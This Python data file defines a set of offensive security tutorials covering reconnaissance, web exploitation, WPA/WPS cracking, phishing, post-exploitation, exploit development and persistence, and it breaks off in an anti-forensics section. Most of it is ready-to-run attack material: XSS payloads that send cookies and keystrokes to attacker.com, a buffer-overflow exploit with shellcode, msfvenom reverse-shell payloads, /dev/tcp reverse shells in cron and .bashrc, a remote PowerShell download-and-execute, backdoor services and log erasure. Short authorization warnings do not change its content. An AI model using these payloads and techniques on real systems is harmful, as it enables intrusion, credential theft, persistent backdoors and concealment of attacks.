TUTORIALS = [
    {
        'id': 'network-reconnaissance',
        'title': 'Advanced Network Reconnaissance',
        'description': 'Master the art of digital reconnaissance - the silent hunter\'s approach to mapping network territories. Learn to become invisible while gathering intelligence on target networks, identifying vulnerable entry points, and building comprehensive attack strategies through systematic enumeration.',
        'difficulty': 'Advanced',
        'duration': '45 minutes',
        'category': 'Reconnaissance',
        'tools': ['nmap', 'masscan', 'zmap', 'unicornscan'],
        'warning': 'Only perform these techniques on networks you own or have explicit permission to test.',
        'modules': [
            {
                'id': 'basic-scanning',
                'title': 'Module 1: Basic Network Scanning',
                'description': 'Foundation scanning techniques and network discovery'
            },
            {
                'id': 'advanced-nmap',
                'title': 'Module 2: Advanced Nmap Techniques',
                'description': 'Stealth scanning and OS fingerprinting'
            },
            {
                'id': 'mass-scanning',
                'title': 'Module 3: Large-Scale Network Scanning',
                'description': 'High-speed scanning with Masscan and Zmap'
            },
            {
                'id': 'service-enumeration',
                'title': 'Module 4: Service Enumeration',
                'description': 'Detailed service discovery and banner grabbing'
            }
        ],
        'steps': [
            {
                'module': 'basic-scanning',
                'title': 'Network Discovery and Host Enumeration',
                'content': 'The digital equivalent of scouting enemy territory - network discovery is your first step into the shadows. Like a reconnaissance specialist mapping terrain before an operation, you\'ll learn to silently identify live hosts, map network boundaries, and gather intelligence without triggering alarms. This foundational technique transforms an unknown network into a detailed battlefield map, revealing targets and potential entry points.',
                'code': '''# Network discovery techniques
ping -c 1 192.168.1.1
fping -a -g 192.168.1.0/24
nmap -sn 192.168.1.0/24

# ARP scanning for local networks
arp-scan -l
arp-scan 192.168.1.0/24
netdiscover -r 192.168.1.0/24

# Basic port scanning
nmap -F 192.168.1.100  # Fast scan
nmap -p- 192.168.1.100  # All ports
nmap -p 1-1000 192.168.1.100  # Port range

# Advanced discovery techniques
nmap -sn -PE -PP -PM -PO 192.168.1.0/24  # Multiple ping types
masscan -p1-65535 192.168.1.0/24 --rate=1000 --ping

# Passive reconnaissance (no direct contact)
dnsrecon -d target.com -t axfr
fierce -dns target.com
sublist3r -d target.com''',
                'explanation': 'Network discovery operates like digital sonar - sending carefully crafted packets to map the network landscape. The ping sweep acts as your reconnaissance probe, while ARP scanning leverages the local network protocol to discover hosts that might be hiding from traditional ICMP requests. Each technique reveals different aspects of the network topology, building a comprehensive intelligence picture without triggering most intrusion detection systems.'
            },
            {
                'module': 'advanced-nmap',
                'title': 'Advanced Nmap Scanning Techniques',
                'content': 'Master the art of stealth scanning - becoming a digital ghost that penetrates network defenses undetected. Advanced Nmap techniques transform you into an invisible infiltrator, using sophisticated evasion methods to bypass firewalls, IDS systems, and security monitoring. Like a skilled locksmith examining a complex security system, you\'ll learn to probe methodically while remaining completely undetected.',
                'code': '''# TCP SYN stealth scan with OS detection
nmap -sS -O -sV --script=vuln target_ip

# UDP scan for common services
nmap -sU --top-ports 1000 target_ip

# Comprehensive scan with NSE scripts
nmap -sC -sV -A --script=default,discovery,safe target_ip

# Timing templates for different scenarios
nmap -T4 -sS target_ip  # Aggressive timing
nmap -T1 -sS target_ip  # Paranoid (very slow)

# Advanced evasion techniques
nmap -f target_ip  # Fragment packets to evade firewalls
nmap -D RND:10 target_ip  # Use 10 random decoy IPs
nmap --source-port 53 target_ip  # Source port spoofing
nmap --data-length 25 target_ip  # Append random data to packets
nmap --spoof-mac 0 target_ip  # Random MAC address spoofing
nmap --badsum target_ip  # Invalid checksum to test firewall behavior''',
                'explanation': 'Advanced Nmap scanning is like conducting surgical reconnaissance - each technique serves a specific purpose in the intelligence gathering process. SYN stealth scans send incomplete TCP handshakes, leaving no trace in system logs. OS detection analyzes TCP/IP stack fingerprints to identify exact operating system versions. Timing templates control scan aggressiveness - T1 paranoid mode spaces packets minutes apart to avoid detection, while T4 aggressive mode floods the target for maximum speed. Fragmentation splits packets into tiny pieces that many firewalls fail to reassemble and analyze properly.'
            },
            {
                'module': 'mass-scanning',
                'title': 'Masscan for Large Network Ranges',
                'content': 'Unleash the power of industrial-strength network scanning - Masscan operates like a digital machine gun, firing millions of packets per second across vast network territories. This high-velocity reconnaissance tool transforms network mapping from a slow, methodical process into lightning-fast intelligence gathering. Perfect for penetration testers who need to scan entire corporate networks, ISP ranges, or even segments of the internet within minutes rather than hours.',
                'code': '''# Fast scan of entire Class C network
masscan -p1-65535 192.168.1.0/24 --rate=1000

# Scan specific ports across multiple networks
masscan -p80,443,22,21 10.0.0.0/8 --rate=10000

# Output results in XML format
masscan -p1-1000 192.168.1.0/24 --rate=1000 -oX scan_results.xml

# Advanced masscan techniques
masscan -p80,443,22,21,25,53,110,995 0.0.0.0/0 --rate=10000 --randomize-hosts
masscan --top-ports 100 192.168.0.0/16 --rate=5000
masscan -p1-65535 target_range --rate=1000 --wait=2 --retries=3''',
                'explanation': 'Masscan operates like a digital carpet bombing campaign - it floods networks with millions of SYN packets, overwhelming targets with sheer volume to quickly identify open ports. The tool bypasses traditional network stacks by implementing its own TCP/IP stack, allowing it to achieve scanning speeds impossible with conventional tools. Rate limiting becomes critical - too fast and you\'ll crash network equipment or trigger every security system, too slow and you lose the speed advantage. The randomization features help avoid pattern detection by security systems.'
            },
            {
                'module': 'mass-scanning',
                'title': 'Zmap for Internet-Wide Scanning',
                'content': 'Enter the realm of internet-scale reconnaissance - Zmap is the ultimate weapon for mapping the global digital landscape. This powerhouse tool can scan the entire IPv4 internet (4+ billion addresses) in under an hour, making it the preferred choice for security researchers conducting large-scale vulnerability studies. Like having a satellite view of the entire digital world, Zmap reveals the massive scope of internet-connected devices and services.',
                'code': '''# Scan entire internet for port 80
zmap -p 80 -o results.txt

# Scan with bandwidth limiting
zmap -p 443 -B 10M -o https_hosts.txt

# Scan specific networks
echo "192.168.0.0/16" | zmap -p 22

# Advanced Zmap configurations
zmap -p 443 -B 100M -o https_servers.txt --output-filter="success = 1"
zmap -p 80 --probe-module=tcp_synscan --output-module=csv
zmap -M icmp_echoscan -o ping_responses.txt
ztee -p 80 | zgrab --port 80 --http="/" | jq''',
                'explanation': 'Zmap achieves internet-scale scanning through revolutionary packet transmission techniques - it can generate over 1.4 million packets per second from a single machine. The tool operates by randomizing target selection and using optimized kernel bypass techniques to avoid traditional network stack bottlenecks. When scanning the entire internet, Zmap essentially conducts a census of global connectivity, revealing everything from misconfigured IoT devices to enterprise servers. The ethical implications are massive - this level of scanning power requires careful consideration of legal boundaries and responsible disclosure practices.'
            },
            {
                'module': 'service-enumeration',
                'title': 'Service Detection and Banner Grabbing',
                'content': 'Transform raw port scans into actionable intelligence through advanced service fingerprinting - the art of digital forensics applied to live systems. Service enumeration is like conducting detailed interrogations of captured network services, extracting crucial information about software versions, configurations, and potential vulnerabilities. This critical phase transforms anonymous open ports into specific attack vectors with known exploit paths.',
                'code': '''# Service version detection
nmap -sV 192.168.1.100
nmap -sC -sV 192.168.1.100  # Default scripts + version detection

# Banner grabbing with netcat
nc -nv 192.168.1.100 80
nc -nv 192.168.1.100 22

# HTTP service enumeration
curl -I http://192.168.1.100
whatweb http://192.168.1.100
nikto -h http://192.168.1.100

# SMB enumeration
enum4linux 192.168.1.100
smbclient -L //192.168.1.100
nbtscan 192.168.1.100

# SNMP enumeration
snmpwalk -v2c -c public 192.168.1.100
onesixtyone -c community.txt 192.168.1.100

# Advanced enumeration techniques
enum4linux -a 192.168.1.100  # Comprehensive SMB enumeration
rpcclient -U "" -N 192.168.1.100  # Null session RPC
showmount -e 192.168.1.100  # NFS exports
finger @192.168.1.100  # User enumeration via finger
rpcinfo -p 192.168.1.100  # RPC service enumeration''',
                'explanation': 'Service enumeration operates like a digital interrogation system - each probe extracts specific pieces of intelligence from target services. Banner grabbing reveals software versions that map directly to known vulnerabilities, while protocol-specific enumeration (SMB, SNMP, RPC) exposes configuration details and user information. The combination of these techniques builds a comprehensive profile of the target system, identifying not just what services are running, but their exact versions, configurations, and potential security weaknesses. This intelligence becomes the foundation for selecting precise exploits and attack vectors.'
            }
        ]
    },
    {
        'id': 'web-application-testing',
        'title': 'Advanced Web Application Penetration Testing',
        'description': 'Penetrate the digital fortress of modern web applications - master the sophisticated art of web exploitation where every input field becomes a potential weapon and every parameter a doorway to system compromise. Transform from web user to web predator, learning to see applications through the eyes of an attacker and exploit the complex vulnerabilities hidden within modern web architectures.',
        'difficulty': 'Expert',
        'duration': '60 minutes',
        'category': 'Web Security',
        'tools': ['burp-suite', 'sqlmap', 'gobuster', 'nikto'],
        'warning': 'These techniques should only be used on applications you own or have written authorization to test.',
        'modules': [
            {
                'id': 'web-reconnaissance',
                'title': 'Module 1: Web Application Reconnaissance',
                'description': 'Discovery and mapping of web application structure'
            },
            {
                'id': 'sql-injection',
                'title': 'Module 2: Advanced SQL Injection',
                'description': 'Complex SQL injection techniques and bypass methods'
            },
            {
                'id': 'xss-exploitation',
                'title': 'Module 3: Cross-Site Scripting (XSS)',
                'description': 'Advanced XSS attacks and payload development'
            },
            {
                'id': 'web-authentication',
                'title': 'Module 4: Authentication Bypass',
                'description': 'Breaking authentication and session management'
            }
        ],
        'steps': [
            {
                'module': 'web-reconnaissance',
                'title': 'Web Application Discovery and Mapping',
                'content': 'Conduct digital reconnaissance on web applications like a cyber-detective investigating a crime scene - every hidden directory, forgotten file, and exposed endpoint becomes crucial evidence in building your attack strategy. This systematic intelligence gathering phase separates amateur attackers from professional penetration testers, revealing the true attack surface of modern web applications through methodical enumeration and analysis.',
                'code': '''# Directory and file enumeration
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,js
dirb http://target.com /usr/share/wordlists/dirb/common.txt

# Technology stack identification
whatweb http://target.com
wappalyzer http://target.com
nmap --script http-enum target.com

# Subdomain enumeration
subfinder -d target.com
amass enum -d target.com
dnsrecon -d target.com -t axfr

# Web crawling and spidering
wget --spider --recursive --no-directories --no-host-directories http://target.com
burpsuite # Use spider functionality

# SSL/TLS analysis
sslscan target.com
testssl.sh target.com''',
                'explanation': 'Web reconnaissance operates like digital archaeology - systematically uncovering layers of hidden application structure. Directory brute-forcing reveals forgotten admin panels, backup files, and development endpoints that developers never intended to expose. Technology fingerprinting identifies specific software versions and frameworks, mapping directly to known vulnerability databases. SSL analysis exposes weak cipher suites and certificate misconfigurations. The combination creates a comprehensive map of the application\'s true attack surface, often revealing critical entry points invisible to casual observation.'
            },
            {
                'module': 'sql-injection',
                'title': 'Advanced SQL Injection Techniques',
                'content': 'Master the dark art of database manipulation through sophisticated SQL injection techniques - transforming innocent input fields into powerful database extraction tools. Advanced SQL injection goes beyond simple UNION attacks, employing blind injection methods, WAF evasion techniques, and second-order exploitation to bypass modern security mechanisms and extract sensitive data from heavily fortified database systems.',
                'code': '''# Boolean-based blind SQL injection
sqlmap -u "http://target.com/page?id=1" --technique=B --dbs

# Time-based blind SQL injection
sqlmap -u "http://target.com/page?id=1" --technique=T --dbs

# Second-order SQL injection
sqlmap -u "http://target.com/login" --data="username=admin&password=pass" --second-order="http://target.com/profile"

# WAF bypass techniques
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,charencode''',
                'explanation': 'Advanced SQL injection operates like a master lockpick working on a complex safe - each technique serves a specific purpose in extracting data from protected databases. Boolean-based blind injection asks yes/no questions to the database, extracting information one bit at a time through carefully crafted conditional statements. Time-based blind injection uses database timing functions to create communication channels when traditional output is blocked. WAF bypass techniques employ encoding, comments, and syntax variations to slip malicious payloads past security filters. Second-order injection plants payloads in one location that execute when data is processed elsewhere in the application.'
            },
            {
                'module': 'web-reconnaissance',
                'title': 'Directory and File Enumeration',
                'content': 'Uncover the hidden digital architecture of web applications through systematic directory and file enumeration - like X-raying a building to reveal its internal structure. This critical reconnaissance phase exposes forgotten admin interfaces, backup files, API endpoints, and configuration files that developers assumed would remain hidden from attackers.',
                'code': '''# Gobuster with custom wordlist and extensions
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,js

# Recursive directory brute forcing
gobuster dir -u http://target.com -w wordlist.txt -r

# Virtual host enumeration
gobuster vhost -u http://target.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt

# API endpoint discovery
gobuster dir -u http://target.com/api -w /usr/share/wordlists/SecLists/Discovery/Web-Content/api/api-endpoints.txt''',
                'explanation': 'Directory enumeration operates like digital archaeology, systematically excavating the hidden layers of web application structure. Gobuster with custom wordlists and file extensions reveals forgotten admin panels, backup files (.bak, .old), and development artifacts that expose sensitive information. Recursive brute-forcing penetrates deeper into directory structures, uncovering nested administrative interfaces. Virtual host enumeration discovers additional applications hosted on the same server, expanding the attack surface. API endpoint discovery exposes modern application interfaces that often lack proper authentication and may contain business logic vulnerabilities.'
            },
            {
                'module': 'xss-exploitation',
                'title': 'Advanced XSS Exploitation',
                'content': 'Transform web browsers into unwitting accomplices through sophisticated cross-site scripting attacks - the art of injecting malicious client-side code that executes within the victim\'s browser context. Advanced XSS exploitation goes beyond simple alert boxes, crafting sophisticated payloads that steal credentials, hijack sessions, perform unauthorized actions, and establish persistent footholds within web applications.',
                'code': '''# DOM-based XSS payload
<img src=x onerror="alert(document.domain)">

# Filter bypass techniques
<svg onload="alert(1)">
<details open ontoggle="alert(1)">
<marquee onstart="alert(1)">

# Cookie stealing payload
<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>

# Keylogger payload
<script>document.onkeypress=function(e){fetch('http://attacker.com/keys?key='+String.fromCharCode(e.which))}</script>''',
                'explanation': 'Advanced XSS exploitation operates like digital puppeteering - controlling victim browsers to perform actions on behalf of the attacker. DOM-based XSS manipulates client-side JavaScript execution without server interaction, making it harder to detect. Filter bypass techniques exploit inconsistencies in input sanitization, using HTML5 event handlers and encoded payloads to circumvent security controls. Cookie stealing payloads establish command channels to attacker-controlled servers, while keyloggers capture sensitive user input in real-time. These techniques transform simple input fields into powerful attack vectors for credential theft and session hijacking.'
            },
            {
                'module': 'web-authentication',
                'title': 'Authentication and Session Security Testing',
                'content': 'Penetrate the digital gatekeepers of web applications through sophisticated authentication bypass techniques - the ultimate test of application security design. Authentication testing reveals the fundamental weaknesses in how applications verify user identity and maintain session state, exposing pathways to complete account takeover and unauthorized system access.',
                'code': '''# Brute force attacks
hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid"
medusa -h target.com -u admin -P passwords.txt -M http -m DIR:/login

# Session token analysis
burpsuite # Analyze session tokens for predictability
john --format=Raw-SHA256 session_tokens.txt

# JWT token manipulation
python3 jwt_tool.py -t http://target.com/api/protected -rh "Authorization: Bearer TOKEN"

# Cookie security testing
# Test for secure flags, httponly, samesite
curl -v http://target.com/login -d "user=admin&pass=password"

# CSRF token bypass
curl -X POST http://target.com/transfer -H "Cookie: session=abc123" -d "amount=1000&to=attacker"

# OAuth vulnerabilities
# Test redirect_uri manipulation
http://target.com/oauth/authorize?response_type=code&client_id=CLIENT&redirect_uri=http://evil.com''',
                'explanation': 'Authentication testing operates like a master safecracker systematically exploring every weakness in digital security mechanisms. Brute force attacks use computational power to overwhelm weak passwords, while session token analysis reveals predictable patterns that enable session hijacking. JWT manipulation exploits cryptographic implementation flaws to forge authentication tokens. Cookie security testing identifies missing security flags that enable session theft through various attack vectors. CSRF bypasses exploit the implicit trust between websites and authenticated users, while OAuth vulnerabilities manipulate the complex authorization flows used by modern applications. These techniques expose the fundamental weaknesses in how applications establish and maintain trusted user sessions.'
            }
        ]
    },
    {
        'id': 'wireless-security',
        'title': 'Advanced Wireless Network Security Testing',
        'description': 'Infiltrate the invisible highways of wireless communication - master the dark arts of radio frequency exploitation where the air itself becomes your attack medium. Wireless hacking transforms you into a digital radio pirate, intercepting, cracking, and manipulating the electromagnetic spectrum to gain unauthorized access to protected networks and eavesdrop on supposedly secure communications.',
        'difficulty': 'Advanced',
        'duration': '50 minutes',
        'category': 'Wireless',
        'tools': ['aircrack-ng', 'reaver', 'hashcat', 'kismet'],
        'warning': 'Only test wireless networks you own or have explicit written permission to test.',
        'steps': [
            {
                'title': 'Monitor Mode and Interface Setup',
                'content': 'Transform your wireless adapter into a powerful reconnaissance device capable of intercepting all radio communications in your vicinity. Monitor mode configuration is like tuning a sophisticated radio scanner that can eavesdrop on every wireless conversation, from WiFi networks to Bluetooth connections, creating the foundation for all advanced wireless attacks.',
                'code': '''# Check wireless interfaces
iwconfig

# Kill interfering processes
airmon-ng check kill

# Enable monitor mode
airmon-ng start wlan0

# Verify monitor mode
iwconfig wlan0mon

# Set specific channel
iwconfig wlan0mon channel 6''',
                'explanation': 'Monitor mode transforms your wireless adapter into a passive surveillance device that captures all radio frequency communications in the surrounding area. Unlike normal mode which only receives data intended for your device, monitor mode enables packet injection and full spectrum analysis. The airmon-ng suite eliminates interfering network processes that could disrupt the wireless card\'s ability to monitor raw 802.11 frames, while channel specification allows focused surveillance on specific frequency bands where target networks operate.'
            },
            {
                'title': 'WPA/WPA2 Security Assessment',
                'content': 'Launch sophisticated cryptographic attacks against WPA/WPA2 wireless encryption - the digital equivalent of cracking a military-grade safe through mathematical force and social engineering. This advanced technique combines passive surveillance with active deauthentication attacks to capture the critical 4-way handshake that contains encrypted network credentials, then applies massive computational power to crack these credentials offline.',
                'code': '''# Capture handshakes
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Deauthentication attack
aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon

# Dictionary attack on captured handshake
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# Hashcat attack on handshake
hashcat -m 2500 capture.hccapx /usr/share/wordlists/rockyou.txt''',
                'explanation': 'WPA/WPA2 cracking operates like digital cryptanalysis combined with psychological warfare. The airodump-ng capture creates a surveillance net around the target network, recording all authentication attempts. Deauthentication attacks force legitimate clients to reconnect, triggering fresh 4-way handshakes that contain the encrypted password hash. These captured handshakes are then subjected to offline dictionary attacks using computational brute force - aircrack-ng for CPU-based cracking or hashcat for GPU-accelerated attacks that can test millions of password combinations per second. The technique exploits the fundamental weakness that WPA security depends entirely on password strength.'
            },
            {
                'title': 'WPS Pin Attack',
                'content': 'Exploit the critical design flaw in WiFi Protected Setup (WPS) - a convenience feature that becomes a massive security backdoor when improperly implemented. WPS pin attacks transform the 8-digit PIN authentication into a trivial mathematical challenge, reducing the effective security from billions of possible passwords to just thousands of PIN combinations that can be cracked in hours.',
                'code': '''# Check for WPS-enabled networks
wash -i wlan0mon

# Reaver WPS pin attack
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv

# Bully WPS attack with delay
bully -b AA:BB:CC:DD:EE:FF -e NETWORK_NAME -c 6 -d 2 wlan0mon

# Pixie dust attack
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K''',
                'explanation': 'WPS attacks exploit a fundamental mathematical flaw in the PIN verification process - the 8-digit PIN is validated in two separate 4-digit halves, reducing the search space from 100,000,000 to approximately 11,000 possible combinations. Reaver systematically brute-forces these PIN combinations, while Bully provides additional timing and protocol manipulation options. The Pixie Dust attack (using -K flag) exploits specific implementation vulnerabilities that can crack WPS in seconds rather than hours, particularly effective against older router firmware. Once the WPS PIN is compromised, the full WPA password is automatically revealed, providing complete network access.'
            }
        ]
    },
    {
        'id': 'social-engineering',
        'title': 'Advanced Social Engineering Techniques',
        'description': 'Psychological manipulation techniques and technical implementation for security testing',
        'difficulty': 'Expert',
        'duration': '40 minutes',
        'category': 'Social Engineering',
        'tools': ['set', 'gophish', 'beef', 'maltego'],
        'warning': 'Social engineering techniques must only be used for authorized security assessments with proper consent.',
        'steps': [
            {
                'title': 'Social Engineering Toolkit (SET)',
                'content': 'Use SET for creating convincing phishing campaigns.',
                'code': '''# Start Social Engineering Toolkit
setoolkit

# Create spear-phishing attack
# Select option 1: Social-Engineering Attacks
# Select option 2: Website Attack Vectors
# Select option 3: Credential Harvester Attack Method
# Select option 2: Site Cloner

# Example configuration:
# IP address: 192.168.1.100
# URL to clone: https://gmail.com

# Monitor harvested credentials
tail -f /root/.set/reports/''',
                'explanation': 'SET provides a framework for creating realistic phishing attacks for security awareness testing.'
            },
            {
                'title': 'Advanced Phishing with Gophish',
                'content': 'Create sophisticated phishing campaigns with tracking and analytics.',
                'code': '''# Install and start Gophish
wget https://github.com/gophish/gophish/releases/download/v0.11.0/gophish-v0.11.0-linux-64bit.zip
unzip gophish-v0.11.0-linux-64bit.zip
chmod +x gophish
./gophish

# Access admin panel at https://localhost:3333
# Default credentials: admin:gophish

# Create email template with tracking
Subject: Important Security Update Required
Body: Please click <a href="{{.URL}}">here</a> to update your account.

# Landing page with credential capture
<form method="POST" action="/">
    Username: <input type="text" name="username">
    Password: <input type="password" name="password">
    <input type="submit" value="Login">
</form>''',
                'explanation': 'Gophish provides professional phishing campaign management with detailed analytics.'
            },
            {
                'title': 'Browser Exploitation Framework (BeEF)',
                'content': 'Hook browsers and perform client-side attacks.',
                'code': '''# Start BeEF
beef-xss

# Access BeEF panel at http://localhost:3000/ui/panel
# Default credentials: beef:beef

# Hook payload for injection
<script src="http://192.168.1.100:3000/hook.js"></script>

# Alternative hook methods:
# Image tag: <img src="http://192.168.1.100:3000/hook.js">
# Iframe: <iframe src="http://192.168.1.100:3000/demos/basic.html">

# Common BeEF modules to execute:
# - Get Cookie
# - Get System Info
# - Redirect Browser
# - Create Alert Dialog
# - Webcam Permission Check''',
                'explanation': 'BeEF allows testing of client-side vulnerabilities through browser hooking and exploitation.'
            }
        ]
    },
    {
        'id': 'post-exploitation',
        'title': 'Advanced Post-Exploitation Techniques',
        'description': 'Comprehensive guide to maintaining access and lateral movement in compromised systems',
        'difficulty': 'Expert',
        'duration': '55 minutes',
        'category': 'Post-Exploitation',
        'tools': ['metasploit', 'empire', 'covenant', 'bloodhound'],
        'warning': 'Post-exploitation techniques should only be performed on systems you own or have explicit authorization to test.',
        'steps': [
            {
                'title': 'Metasploit Post-Exploitation Modules',
                'content': 'Advanced Metasploit techniques for post-exploitation activities.',
                'code': '''# Start Metasploit console
msfconsole

# Load post-exploitation modules after getting meterpreter session
use post/windows/gather/enum_system
set SESSION 1
run

# Privilege escalation
use post/multi/recon/local_exploit_suggester
set SESSION 1
run

# Persistence techniques
use post/windows/manage/persistence_exe
set SESSION 1
set REXEPATH /root/backdoor.exe
run

# Lateral movement
use post/windows/gather/enum_domain
set SESSION 1
run''',
                'explanation': 'Metasploit provides comprehensive post-exploitation modules for various operating systems.'
            },
            {
                'title': 'PowerShell Empire for Windows',
                'content': 'Use PowerShell Empire for advanced Windows post-exploitation.',
                'code': '''# Start Empire server
./empire --rest

# Create listener
listeners
uselistener http
set Host 192.168.1.100
set Port 8080
execute

# Generate stager
usestager windows/launcher_bat
set Listener http
generate

# Execute on target and interact with agent
agents
interact AGENT_NAME

# Common Empire modules
usemodule situational_awareness/network/powerview/get_domain_controller
usemodule collection/browser_data
usemodule persistence/elevated/registry''',
                'explanation': 'PowerShell Empire provides a post-exploitation framework specifically designed for Windows environments.'
            },
            {
                'title': 'BloodHound for Active Directory',
                'content': 'Map Active Directory environments and find attack paths.',
                'code': '''# Start Neo4j database
neo4j start

# Start BloodHound
./BloodHound --no-sandbox

# Collect data using SharpHound
.\SharpHound.exe -c All -d domain.local

# Alternative collection with PowerShell
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -Domain domain.local

# Common queries in BloodHound:
# - Find all Domain Admins
# - Find Shortest Paths to Domain Admins
# - Find Computers with Unconstrained Delegation
# - Find Users with DCSync Rights''',
                'explanation': 'BloodHound helps identify attack paths in Active Directory environments through graph analysis.'
            }
        ]
    },
    {
        'id': 'vulnerability-assessment',
        'title': 'Advanced Vulnerability Assessment & Exploitation',
        'description': 'Comprehensive vulnerability scanning, analysis, and exploitation techniques using professional-grade tools',
        'difficulty': 'Expert',
        'duration': '70 minutes',
        'category': 'Vulnerability Assessment',
        'tools': ['nessus', 'openvas', 'nikto', 'searchsploit', 'exploit-db'],
        'warning': 'Vulnerability exploitation should only be performed in authorized environments with proper documentation.',
        'steps': [
            {
                'title': 'Comprehensive Vulnerability Scanning',
                'content': 'Perform thorough vulnerability assessments using multiple scanning engines.',
                'code': '''# OpenVAS comprehensive scan
openvas-start
openvas-adduser admin
openvas-mkcert
openvas-nvt-sync

# Nessus professional scanning
/opt/nessus/sbin/nessuscli adduser admin
/opt/nessus/sbin/nessuscli policies --list
systemctl start nessusd

# Nikto web vulnerability scanner
nikto -h http://target.com -output nikto_results.txt
nikto -h http://target.com -Cgidirs all -maxtime 300s

# Custom vulnerability assessment
nmap --script vuln target.com
nmap --script exploit target.com''',
                'explanation': 'Multiple vulnerability scanners provide different perspectives and detect various types of security flaws.'
            },
            {
                'title': 'Exploit Database Integration',
                'content': 'Search and utilize exploits from comprehensive databases.',
                'code': '''# SearchSploit exploit database searches
searchsploit apache 2.4
searchsploit -x 47887.py
searchsploit --mirror 47887

# Exploit Database integration
updatedb
locate exploit-db
find /usr/share/exploitdb -name "*.py" | grep -i apache

# Custom exploit modification
cp /usr/share/exploitdb/exploits/linux/remote/exploit.py ./
sed -i 's/RHOST = "127.0.0.1"/RHOST = "target.com"/' exploit.py

# Payload generation for custom exploits
msfvenom -p linux/x64/shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f elf > shell.elf
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe > backdoor.exe''',
                'explanation': 'Leveraging existing exploit databases saves time and provides tested attack vectors for known vulnerabilities.'
            },
            {
                'title': 'Custom Exploit Development',
                'content': 'Develop custom exploits for discovered vulnerabilities.',
                'code': '''# Buffer overflow exploit template
#!/usr/bin/env python3
import socket
import struct

# Target configuration
target_ip = "192.168.1.100"
target_port = 9999

# Shellcode generation (msfvenom)
shellcode = (
    b"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e"
    b"\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"
)

# Exploit construction
offset = 146
ret_address = struct.pack("<I", 0x625011af)
nop_sled = b"\\x90" * 16

exploit = b"A" * offset + ret_address + nop_sled + shellcode

# Send exploit
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, target_port))
s.send(exploit)
s.close()

# SQL injection exploit
import requests

# Custom SQLi payload
payload = {
    'username': "admin' UNION SELECT 1,2,database()-- -",
    'password': 'anything'
}

response = requests.post('http://target.com/login', data=payload)
print(response.text)''',
                'explanation': 'Custom exploit development allows targeting specific vulnerabilities not covered by existing exploits.'
            }
        ]
    },
    {
        'id': 'advanced-persistence',
        'title': 'Advanced Persistence & Stealth Techniques',
        'description': 'Master sophisticated methods for maintaining long-term access while evading detection',
        'difficulty': 'Expert',
        'duration': '65 minutes',
        'category': 'Persistence',
        'tools': ['empire', 'covenant', 'pupy', 'veil-evasion'],
        'warning': 'Persistence techniques must only be used in authorized penetration testing scenarios.',
        'steps': [
            {
                'title': 'Advanced Windows Persistence',
                'content': 'Implement sophisticated persistence mechanisms on Windows systems.',
                'code': '''# Registry-based persistence
reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SecurityUpdate" /t REG_SZ /d "C:\\Windows\\System32\\backdoor.exe"

# Service-based persistence
sc create "WindowsSecurityService" binpath= "C:\\Windows\\System32\\backdoor.exe" start= auto
sc description "WindowsSecurityService" "Provides critical security updates"

# WMI event-based persistence
wmic /node:localhost /namespace:\\\\root\\subscription PATH __EventFilter CREATE Name="BotFilter48", EventNameSpace="root\\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"

# PowerShell profile persistence
echo 'IEX (New-Object Net.WebClient).DownloadString("http://attacker.com/payload.ps1")' >> $PROFILE

# DLL hijacking persistence
copy malicious.dll "C:\\Program Files\\Application\\legitimate.dll"

# Scheduled task persistence
schtasks /create /tn "SystemMaintenance" /tr "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\\Windows\\System32\\backdoor.ps1" /sc daily /st 09:00''',
                'explanation': 'Multiple persistence vectors increase chances of maintaining access even if some methods are discovered.'
            },
            {
                'title': 'Linux Persistence Techniques',
                'content': 'Establish persistent access on Linux systems using various methods.',
                'code': '''# Cron job persistence
echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'" | crontab -

# SSH key persistence
mkdir -p ~/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Systemd service persistence
cat > /etc/systemd/system/security-update.service << EOF
[Unit]
Description=Security Update Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash /tmp/backdoor.sh
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl enable security-update.service
systemctl start security-update.service

# Bashrc persistence
echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1 &' >> ~/.bashrc

# Library hijacking persistence
export LD_PRELOAD="/tmp/malicious.so"
echo 'export LD_PRELOAD="/tmp/malicious.so"' >> ~/.bashrc

# Init.d persistence (older systems)
cp backdoor.sh /etc/init.d/security-service
chmod +x /etc/init.d/security-service
update-rc.d security-service defaults''',
                'explanation': 'Linux persistence requires understanding of various startup mechanisms and user environments.'
            },
            {
                'title': 'Evasion and Anti-Forensics',
                'content': 'Implement techniques to avoid detection and complicate forensic analysis.',
                'code': '''# Log evasion techniques
# Clear specific log entries
sed -i '/attacker_ip/d' /var/log/auth.log
sed -i '/suspicious_activity/d' /var/log/syslog

# Timestamp manipulation
